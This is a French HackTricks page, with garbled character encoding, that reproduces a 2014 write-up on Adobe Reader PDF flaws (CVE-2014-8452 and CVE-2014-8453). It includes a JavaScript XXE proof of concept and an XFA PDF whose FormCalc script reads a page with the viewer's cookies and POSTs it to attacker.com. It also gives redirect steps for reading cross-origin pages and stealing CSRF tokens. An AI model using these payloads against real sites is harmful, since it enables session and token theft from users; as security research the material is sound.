# TÃ©lÃ©chargement de PDF - Contournement XXE et CORS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

#### Contenu copiÃ© depuis [https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html](https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html)

### La fonction Javascript dans Reader peut Ãªtre utilisÃ©e pour lire des donnÃ©es Ã  partir d'entitÃ©s externes (CVE-2014-8452)

Statut : CorrigÃ©\
RÃ©alitÃ© : Non corrigÃ©\
\
Celui-ci concerne un simple XXE que j'ai dÃ©couvert.\
J'ai lu l'article "Polyglots: Crossing Origins by Crossing Formats", oÃ¹ ils ont discutÃ© d'une vulnÃ©rabilitÃ© dans\
XMLData.parse. Il Ã©tait possible d'utiliser des entitÃ©s externes et de les rÃ©fÃ©rencer.\
J'ai lu la spÃ©cification et il s'avÃ¨re qu'il y a plus de fonctions que "parse" pour lire XML.\
J'ai crÃ©Ã© un simple fichier xml, qui rÃ©fÃ©rence une URL du mÃªme domaine et je l'ai analysÃ© avec loadXML.\
Ã‡a a marchÃ© :

![](https://4.bp.blogspot.com/-is4Q5hSZk-Y/VIwdzdAckWI/AAAAAAAAACI/OAzBs9Q-T50/s1600/xxe.png)
```
7 0 obj
<<
 /Type /Action
/S /JavaScript
/JS (
var cXMLDoc = '<?xml version="1.0" encoding="ISO-8859-1"?><foo>muh</foo>'
var cXMLDoc2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY aaaa SYSTEM "http://example.com">]><ab>&aaaa;</ab>'
xml = XMLData.parse(cXMLDoc,false);
xml.loadXML(cXMLDoc2,false,true);
)
>>
endobj
```
L'impact est limitÃ© car\
o) il est limitÃ© Ã  la mÃªme origine\
o) les pages HTML cassent le XML\
o) les entitÃ©s dynamiques ne sont pas prises en charge\
o) J'ai eu l'idÃ©e d'utiliser un XML utf-16 pour Ã©viter de casser la structure XML, mais cela n'a pas fonctionnÃ©.\
\
Mais cela peut encore Ãªtre utilisÃ© pour lire JSON.

### Contournement de la politique de mÃªme origine dans Reader (CVE-2014-8453)

Statut: corrigÃ©\
RÃ©alitÃ©: corrigÃ© mais mÃªme origine toujours vulnÃ©rable!\
\
Ã€ mon avis, c'est la vulnÃ©rabilitÃ© la plus puissante. MÃªme sans le contournement d'origine, cela vous montre\
Ã  quel point les PDF peuvent Ãªtre puissants/terrifiants.\
Beaucoup de gens savent que les PDF prennent en charge un langage de script appelÃ© Javascript, mais il y en a un autre.\
Il est mentionnÃ© dans la spÃ©cification pour XFA, un type de fichier Ã©galement pris en charge par le lecteur Adobe.\
Il s'appelle formcalc et il n'est pas si puissant. Il est utilisÃ© pour des calculs mathÃ©matiques simples. Mais dans la spÃ©cification Adobe,\
il y a trois fonctions supplÃ©mentaires: 'GET', 'POST' et 'PUT'. Oui, leurs noms parlent d'eux-mÃªmes.\
'GET' a un paramÃ¨tre: une URL. Il utilisera le navigateur (OUI, LES COOKIES) pour rÃ©cupÃ©rer l'URL et renvoyer le contenu de celle-ci.\
Nous pouvons ensuite utiliser 'POST' pour envoyer le contenu renvoyÃ© Ã  notre propre serveur:\
\
var content = GET("myfriends.php");\
Post("http://attaquant.com",content);\
\
Ces fonctions sont de mÃªme origine, donc un site Web doit nous permettre de tÃ©lÃ©charger un PDF. Ce n'est pas si irrÃ©aliste pour\
la plupart des sites Web. Attaquant.com n'est pas de mÃªme origine, donc vous devez configurer un crossdomain.xml, comme d'habitude avec les produits Adobe.\
\
Pour rÃ©sumer: Ce n'est pas un bug, c'est une fonctionnalitÃ©. DÃ¨s que vous Ãªtes autorisÃ© Ã  tÃ©lÃ©charger un PDF sur un site Web,\
vous pouvez accÃ©der au site Web dans le contexte de l'utilisateur qui visualise le PDF. Parce que les demandes sont Ã©mises\
par le navigateur, les cookies sont Ã©galement envoyÃ©s. Vous pouvez Ã©galement l'utiliser pour casser toute protection CSRF en lisant les jetons.
```
% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

% modified by insertscript

%PDF-1. % can be truncated to %PDF-\0

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
    <interactive>1</interactive>
</pdf></present></config>
<template>
    <subform name="_">
        <pageSet/>
        <field id="Hello World!">
            <event activity="initialize">
                <script contentType='application/x-formcalc'>
     var content = GET("myfriends.php");
                   Post("http://attacker.com",content);
                </script>
            </event>
        </field>
    </subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
    /Root <<
        /AcroForm <<
            /Fields [<<
                /T (0)
                /Kids [<<
                    /Subtype /Widget
                    /Rect []
                    /T ()
                    /FT /Btn
                >>]
            >>]
            /XFA 1 0 R
        >>
        /Pages <<>>
    >>
>>
```
AprÃ¨s avoir trouvÃ© ces fonctions, j'ai dÃ©couvert une faille de la politique de mÃªme origine. Cela permet d'utiliser le navigateur de la victime comme proxy (@beef travaille encore sur le module^^).

La faille est vraiment simple :

1. L'utilisateur A charge evil.pdf depuis http://attacker.com/evil.pdf
2. Evil.pdf utilise formcalc GET pour lire http://attacker.com/redirect.php
3. redirect.php redirige avec 301 vers http://facebook.com
4. Adobe reader suivra et lira la rÃ©ponse sans chercher de crossdomain.xml.
5. evil.pdf envoie le contenu rÃ©cupÃ©rÃ© via POST Ã  http://attacker.com/log.php

Notez qu'en utilisant cette technique, vous pouvez voler les jetons CRSF d'une page et exploiter les vulnÃ©rabilitÃ©s CSRF.

Cette simple faille est maintenant corrigÃ©e. J'espÃ¨re qu'ils vont Ã©galement implÃ©menter un avertissement de dialogue pour les demandes de mÃªme origine.
